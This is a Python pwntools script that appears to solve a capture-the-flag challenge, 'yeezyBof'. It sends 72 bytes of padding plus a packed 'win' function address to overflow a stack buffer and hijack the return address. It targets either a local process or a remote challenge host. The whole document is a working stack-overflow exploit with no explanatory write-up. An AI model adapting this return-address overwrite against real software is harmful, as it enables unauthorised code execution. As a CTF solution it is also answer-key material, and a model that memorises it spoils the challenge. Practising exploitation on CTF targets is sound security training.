#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './yeezyBof'
elf = ELF(binary)

# Addresses (from binary analysis and INFO output)
win_addr = 0x4011f6

# Buffer is at rbp-0x40 (64 bytes)
# RET address is at rbp+0x8
# Offset = 0x40 + 0x8 = 72 bytes
offset = 72

def exploit(target):
    # Receive banner and prompts
    target.recvuntil(b'=== === === === === === ===\n')
    
    # Build payload
    payload = b'A' * offset
    payload += p64(win_addr)
    
    # Send exploit
    target.sendlineafter(b'What\'s your name : ', payload)
    
    # Get flag
    target.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        target = remote('pwn.runa2025.kr', 7001)
    else:
        target = process(binary)
    
    exploit(target)
